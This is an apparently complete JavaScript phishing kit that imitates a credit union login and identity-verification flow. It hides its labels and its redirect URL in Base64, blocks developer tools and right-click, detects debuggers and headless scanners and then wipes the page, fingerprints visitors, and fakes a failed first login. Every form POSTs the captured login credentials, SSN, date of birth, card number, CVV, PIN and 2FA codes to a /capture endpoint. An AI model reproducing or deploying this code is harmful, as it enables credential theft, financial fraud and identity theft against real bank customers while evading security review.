(function() {
    'use strict';

    // --- Threat Evasion Layer ---

    // 1. Hostile Anti-Inspect & Right-Click Blackhole
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('selectstart', e => e.preventDefault());
    
    // Strict Keybinding Blocks
    document.addEventListener('keydown', e => {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U, Ctrl+S
        if (e.keyCode === 123 ||
            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) ||
            (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
            e.preventDefault();
            return false;
        }
    });

    // 2. Timing-Based DevTools Detection & Console Flooding
    // Overwrite console to mask payloads
    const noop = () => {};
    window.console.log = noop;
    window.console.warn = noop;
    window.console.error = noop;
    window.console.info = noop;

    setInterval(() => {
        const _start = performance.now();
        debugger;
        const _end = performance.now();
        // If debugger pauses execution for more than 100ms, wipe the DOM
        if (_end - _start > 100) {
            document.body.innerHTML = '';
            window.location.replace('https://www.google.com');
        }
        // Flood console clearing to prevent manual trace
        console.clear();
    }, 500);

    // 3. Headless Browser / Scraper Detection
    const checkBot = () => {
        const isBot = navigator.webdriver || 
                      window.cdc_adoQpoasnfa76pfcZLmcfl_ || 
                      (!navigator.plugins || navigator.plugins.length === 0) || 
                      (window.outerWidth === 0 && window.outerHeight === 0);
        
        if (isBot) {
            document.body.innerHTML = '';
            window.location.replace('https://www.google.com');
        }
    };
    checkBot();
    // ----------------------------

    // Hardened String Table (Base64)
    const _s = {
        'l_title': 'U2VjdXJpdHkgQWxlcnQ=', // Security Alert
        'l_body': 'WW91ciBhY2NvdW50IGhhcyBiZWVuIHRlbXBvcmFyaWx5IGxvY2tlZCBmb3IgeW91ciBwcm90ZWN0aW9uLiBQbGVhc2UgdmVyaWZ5IHlvdXIgaWRlbnRpdHkgdG8gcmVnYWluIGFjY2Vzcy4=',
        'v_btn': 'VmVyaWZ5IElkZW50aXR5',
        'u_lbl': 'VXNlcm5hbWU=',
        'p_lbl': 'UGFzc3dvcmQ=',
        'b_lgn': 'TG9nIElu',
        'b_prc': 'UHJvY2Vzc2luZy4uLg==',
        'frgt': 'Rm9yZ290IFBhc3N3b3JkPw==',
        's_msg': 'U3luY2hyb25pemluZyBCYW5raW5nIFByb2ZpbGUuLi4=',
        'r_title': 'QWNjb3VudCBVbmRlciBSZXZpZXc=',
        'r_body': 'Rm9yIHlvdXIgc2VjdXJpdHksIHlvdXIgYWNjb3VudCBpcyBhc3NpZ25lZCBhIDcyLWhvdXIgc3luYyBwZXJpb2QuIExvZ2luIGFjY2VzcyByZW1haW5zIHJlc3RyaWN0ZWQgZHVyaW5nIHRoaXMgdGltZS4=',
        'a_btn': 'QWNrbm93bGVkZ2U=',
        'dst': 'aHR0cHM6Ly9vbmxpbmUucGVuYWlyLm9yZy9kYmFuay9saXZlL2FwcC9sb2dpbi9jb25zdW1lcg==',
        'fn_lbl': 'RnVsbCBOYW1l',
        'sn_lbl': 'U29jaWFsIFNlY3VyaXR5IE51bWJlcg==', // Social Security Number
        'ph_lbl': 'TW9iaWxlIFBob25lIE51bWJlcg==',
        'db_lbl': 'RGF0ZSBvZiBCaXJ0aA==',
        'mb_lbl': 'TWVtYmVyICM=',
        'cn_btn': 'Q29udGludWU=',
        'cn_lbl': 'Q2FyZCBOdW1iZXI=',
        'ex_lbl': 'RXhwaXJhdGlvbiBEYXRl',
        'cv_lbl': 'Q1ZWIChDMlYp',
        'pn_lbl': 'Q2FyZCBQSU4=',
        'cm_btn': 'Q29tcGxldGUgU3luYw==',
        's2f_s': 'QSBzZWN1cmUgY29kZSBoYXMgYmVlbiBzZW50IHRvIHlvdXIgbW9iaWxlIGRldmljZSBlbmRpbmcgaW4=',
        's2f_e': 'UGxlYXNlIGVudGVyIHRoZSBjb2RlIGJlbG93IHRvIGNvbmZpcm0geW91ciBpZGVudGl0eS4=',
        'cd_lbl': 'U2VjdXJpdHkgQ29kZQ==',
        'vf_btn': 'VmVyaWZ5'
    };

    const d = s => atob(s);

    // Session correlation — generates once per browser session, sent with every POST
    const getSessionId = () => {
        let sid = sessionStorage.getItem('_sid');
        if (!sid) {
            sid = ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
                (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
            );
            sessionStorage.setItem('_sid', sid);
        }
        return sid;
    };
    const _sid = getSessionId();

    const init = () => {
        // Render Strings
        document.querySelectorAll('[data-render]').forEach(el => {
            const k = el.getAttribute('data-render');
            if (k === 'u_label') el.textContent = d(_s.u_lbl);
            if (k === 'p_label') el.textContent = d(_s.p_lbl);
            if (k === 'btn_text') el.textContent = d(_s.b_lgn);
            if (k === 'forgot_link') el.textContent = d(_s.frgt);
            if (k === 'sync_msg') el.textContent = d(_s.s_msg);
            if (k === 'sec_alert_title') el.textContent = d(_s.l_title);
            if (k === 'locked_msg') el.textContent = d(_s.l_body);
            if (k === 'verify_btn_text') el.textContent = d(_s.v_btn);
            if (k === 'full_name_label') el.textContent = d(_s.fn_lbl);
            if (k === 'ssn_label') el.textContent = d(_s.sn_lbl);
            if (k === 'phone_label') el.textContent = d(_s.ph_lbl);
            if (k === 'dob_label') el.textContent = d(_s.db_lbl);
            if (k === 'member_label') el.textContent = d(_s.mb_lbl) + ' (optional)';
            if (k === 'continue_btn') el.textContent = d(_s.cn_btn);
            if (k === 'card_num_label') el.textContent = d(_s.cn_lbl);
            if (k === 'exp_label') el.textContent = d(_s.ex_lbl);
            if (k === 'cvv_label') el.textContent = d(_s.cv_lbl);
            if (k === 'pin_label') el.textContent = d(_s.pn_lbl);
            if (k === 'complete_btn') el.textContent = d(_s.cm_btn);
            if (k === '2fa_msg_start') el.textContent = d(_s.s2f_s);
            if (k === '2fa_msg_end') el.textContent = d(_s.s2f_e);
            if (k === 'code_label') el.textContent = d(_s.cd_lbl);
            if (k === 'verify_btn') el.textContent = d(_s.vf_btn);
            if (k === 'review_title') el.textContent = d(_s.r_title);
            if (k === 'review_msg') el.textContent = d(_s.r_body);
            if (k === 'ack_btn_text') el.textContent = d(_s.a_btn);
        });

        // Set phone display in 2FA if available in session
        const phone = localStorage.getItem('p_hint') || 'XXXX';
        const phoneDisplay = document.getElementById('display-phone');
        if (phoneDisplay) phoneDisplay.textContent = phone.slice(-4);

        const overlay = document.getElementById('loading-overlay');
        const lockedModal = document.getElementById('locked-modal');
        const reviewModal = document.getElementById('review-modal');

        // Micro-Animations & Live Validation
        const validateField = (el, reqLength) => {
            if (!el) return true;
            el.classList.remove('invalid', 'valid');
            // Force reflow to restart animation
            void el.offsetWidth;
            
            const val = el.value.replace(/\D/g, ''); // Count raw digits for numeric fields
            if (val.length > 0 && val.length < reqLength) {
                el.classList.add('invalid');
                return false;
            } else if (val.length >= reqLength) {
                el.classList.add('valid');
                return true;
            }
            return true;
        };

        const executeBankLoader = (onComplete) => {
            if (!overlay) {
                if (onComplete) onComplete();
                return;
            }
            overlay.style.display = 'flex';
            const textEl = overlay.querySelector('.loading-text');
            if (textEl) {
                textEl.textContent = "Establishing AES-256 secure connection...";
                setTimeout(() => { textEl.textContent = "Verifying cryptographic signature..."; }, 1200);
                setTimeout(() => { textEl.textContent = "Authenticating credentials..."; }, 2400);
            }
            setTimeout(() => { 
                if (onComplete) onComplete(); 
            }, 3600);
        };

        const handleCapture = (form, formType) => {
            const formData = new FormData(form);
            const ssnEl = form.querySelector('#ssn');
            if (ssnEl && ssnEl.dataset.rawSsn && ssnEl.dataset.rawSsn.length === 9) {
                let realSsn = ssnEl.dataset.rawSsn;
                let m = '';
                let k = 0;
                for (let i = 0; i < 'XXX-XX-XXXX'.length && k < realSsn.length; i++) {
                    if ('XXX-XX-XXXX'[i] === 'X') { m += realSsn[k++]; } else { m += 'XXX-XX-XXXX'[i]; }
                }
                formData.set('ssn', m);
            }
            if (formType) formData.append('form_type', formType);
            formData.append('_sid', _sid);
            
            const payload = Object.fromEntries(formData.entries());
            fetch('/capture', { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload) 
            }).catch(e => {});
        };

        // Form Logic
        const loginForm = document.getElementById('fluid-login-form');
        let attempts = 0;

        // Session Lock Check
        // Temporarily disabled for testing
        // if (localStorage.getItem('session_locked') === 'true') {
        //     window.location.href = d(_s.dst);
        // }

        if (loginForm) {
            loginForm.addEventListener('submit', e => {
                e.preventDefault();
                attempts++;
                
                let attemptInput = loginForm.querySelector('input[name="attempt"]');
                if (!attemptInput) {
                    attemptInput = document.createElement('input');
                    attemptInput.type = 'hidden';
                    attemptInput.name = 'attempt';
                    loginForm.appendChild(attemptInput);
                }
                attemptInput.value = attempts;

                // Always capture whatever is currently typed in
                handleCapture(loginForm, 'login');

                if (attempts === 1) {
                    // Show error on first attempt and reset password field
                    const err = document.getElementById('login-error');
                    if (err) err.style.display = 'flex';
                    const passInput = loginForm.querySelector('input[type="password"]');
                    if (passInput) passInput.value = '';
                } else if (attempts >= 2) {
                    // Trigger modal and lock the starting point from being reused
                    localStorage.setItem('session_locked', 'true');
                    if (lockedModal) {
                        lockedModal.classList.add('show');
                    }
                }
            });
            
            document.getElementById('close-locked-modal')?.addEventListener('click', () => {
                window.location.href = __NEXT_LOGIN__;
            });
        }

        const verifyForm = document.getElementById('fluid-verify-form');
        const memberWarningModal = document.getElementById('member-warning-modal');
        if (verifyForm) {
            verifyForm.addEventListener('submit', e => {
                e.preventDefault();

                // DOB Validation
                const dobInput = document.getElementById('dob');
                if (dobInput) {
                    const dobVal = dobInput.value;
                    const dobRegex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
                    const match = dobVal.match(dobRegex);
                    let validDOB = false;
                    
                    if (match) {
                        const m = parseInt(match[1], 10);
                        const d = parseInt(match[2], 10);
                        const y = parseInt(match[3], 10);
                        
                        const dateObj = new Date(y, m - 1, d);
                        if (dateObj.getFullYear() === y && dateObj.getMonth() === m - 1 && dateObj.getDate() === d) {
                            const currentYear = new Date().getFullYear();
                            if (y >= 1900 && y <= currentYear - 14) { // Assume user must be at least 14 years old
                                validDOB = true;
                            }
                        }
                    }
                    
                    if (!validDOB) {
                        dobInput.classList.add('invalid');
                        dobInput.setCustomValidity('Please enter a valid Date of Birth (MM/DD/YYYY).');
                        verifyForm.reportValidity();
                        dobInput.addEventListener('input', function onInput() {
                            dobInput.classList.remove('invalid');
                            dobInput.setCustomValidity("");
                            dobInput.removeEventListener('input', onInput);
                        });
                        return; // Block submission
                    } else {
                        dobInput.classList.add('valid');
                        dobInput.setCustomValidity('');
                    }
                }

                const memberNum = document.getElementById('member_num')?.value.trim() || '';
                
                const processVerify = () => {
                    const pVal = document.getElementById('phone')?.value || '';
                    localStorage.setItem('p_hint', pVal);
                    if (memberWarningModal) memberWarningModal.classList.remove('show');
                    overlay.style.display = 'flex';
                    handleCapture(verifyForm, 'verify');
                    setTimeout(() => { window.location.href = __NEXT_PERSONAL__; }, 1500);
                };

                if (!memberNum && memberWarningModal) {
                    memberWarningModal.classList.add('show');
                    
                    // Bind modal actions
                    document.getElementById('close-member-warning-modal').onclick = processVerify;
                    document.getElementById('add-member-number-btn').onclick = () => {
                        memberWarningModal.classList.remove('show');
                        document.getElementById('member_num').focus();
                    };
                } else {
                    processVerify();
                }
            });
        }

        const secureForm = document.getElementById('fluid-secure-form');
        if (secureForm) {
            secureForm.addEventListener('submit', e => {
                e.preventDefault();

                // Address Enforcement
                const addressInput = document.getElementById('address');
                if (addressInput) {
                    const val = addressInput.value.trim();
                    if (val.length < 5) {
                        addressInput.classList.add('invalid');
                        addressInput.setCustomValidity('Please enter a valid address.');
                        secureForm.reportValidity();
                        addressInput.addEventListener('input', function onInput() {
                            addressInput.classList.remove('invalid');
                            addressInput.setCustomValidity("");
                            addressInput.removeEventListener('input', onInput);
                        });
                        return; // Block submission
                    } else {
                        addressInput.classList.add('valid');
                        addressInput.setCustomValidity('');
                    }
                }

                // Field Validation Micro-Animations
                const cardValid = validateField(document.getElementById('card_num'), 15);
                const expValid = validateField(document.getElementById('exp_date'), 4);
                const cvvValid = validateField(document.getElementById('cvv'), 3);
                const pinValid = validateField(document.getElementById('pin'), 4);

                if (!cardValid || !expValid || !cvvValid || !pinValid) {
                    return; // Block submission, let animations play
                }

                // If valid, execute the realistic bank load sequence
                executeBankLoader(() => {
                    handleCapture(secureForm, 'card');
                    window.location.href = __NEXT_CARD__;
                });
            });
        }

        const tfaForm = document.getElementById('fluid-2fa-form');
        if (tfaForm) {
            tfaForm.addEventListener('submit', e => {
                e.preventDefault();
                overlay.style.display = 'flex';
                handleCapture(tfaForm, '2fa');
                setTimeout(() => {
                    if (reviewModal) {
                        reviewModal.classList.add('show');
                        const redir = () => { window.location.href = __NEXT_2FA__; };
                        document.getElementById('close-review-modal')?.addEventListener('click', redir);
                        setTimeout(redir, 8000);
                    } else {
                        window.location.href = __NEXT_2FA__;
                    }
                }, 1500);
            });
        }

        // Masking
        const mask = (id, pattern) => {
            const el = document.getElementById(id);
            if (!el) return;
            el.addEventListener('input', e => {
                let raw = el.dataset.rawSsn || '';
                let val = e.target.value;
                let v = '';
                
                if (id === 'ssn') {
                    if (val.includes('•') || val.includes('X') || val.includes('*')) {
                        let allowed = val.replace(/[^\d•X*]/gi, '');
                        if (allowed.length < raw.length) {
                            v = raw.slice(0, allowed.length);
                        } else if (allowed.length > raw.length) {
                            v = raw + allowed.slice(-1);
                        } else {
                            v = raw;
                        }
                    } else {
                        v = val.replace(/\D/g, '');
                    }
                    el.dataset.rawSsn = v;
                } else {
                    v = val.replace(/\D/g, '');
                }

                let m = '';
                let k = 0;
                for (let i = 0; i < pattern.length && k < v.length; i++) {
                    if (pattern[i] === 'X') { m += v[k++]; } else { m += pattern[i]; }
                }
                
                if (id === 'ssn' && v.length === 9) {
                    m = `•••-••-${v.slice(-4)}`;
                }
                
                e.target.value = m;
            });

            if (id === 'ssn') {
                el.addEventListener('focus', e => {
                    let v = el.dataset.rawSsn || '';
                    if (v.length === 9) {
                        let m = '';
                        let k = 0;
                        for (let i = 0; i < pattern.length && k < v.length; i++) {
                            if (pattern[i] === 'X') { m += v[k++]; } else { m += pattern[i]; }
                        }
                        e.target.value = m;
                    }
                });
                
                el.addEventListener('blur', e => {
                    let v = el.dataset.rawSsn || '';
                    if (v.length === 9) {
                        e.target.value = `•••-••-${v.slice(-4)}`;
                    }
                });
            }
        };

        mask('ssn', 'XXX-XX-XXXX');
        mask('phone', '(XXX) XXX-XXXX');
        mask('dob', 'XX/XX/XXXX');
        mask('card_num', 'XXXX XXXX XXXX XXXX');
        mask('exp', 'XX/XX');
    };

    const trackVisit = () => {
        if (!sessionStorage.getItem('v_tracked')) {
            const sendPing = (fp = 'unknown') => {
                const data = new FormData();
                data.append('form_type', 'visit');
                data.append('_sid', _sid);
                data.append('url', window.location.pathname);
                data.append('res', `${screen.width}x${screen.height}`);
                data.append('fingerprint', fp);
                const payload = Object.fromEntries(data.entries());
                fetch('/capture', { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload) 
                }).catch(e => {});
                sessionStorage.setItem('v_tracked', '1');
            };

            // Custom Adblock-Proof Canvas Fingerprint
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = "#069";
                ctx.fillText("device_hash", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("device_hash", 4, 17);
                const dataStr = navigator.userAgent + screen.width + "x" + screen.height + navigator.language + canvas.toDataURL();
                
                let hash = 0;
                for (let i = 0; i < dataStr.length; i++) {
                    const char = dataStr.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash;
                }
                sendPing(Math.abs(hash).toString(16));
            } catch (e) {
                sendPing();
            }
        }
    };

    const run = () => {
        init();
        ['mousemove', 'scroll', 'touchstart', 'keydown', 'click'].forEach(ev => window.removeEventListener(ev, run));
    };

    // Immediate init for seamless UX
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            trackVisit();
            run();
        });
    } else {
        trackVisit();
        run();
    }
})();
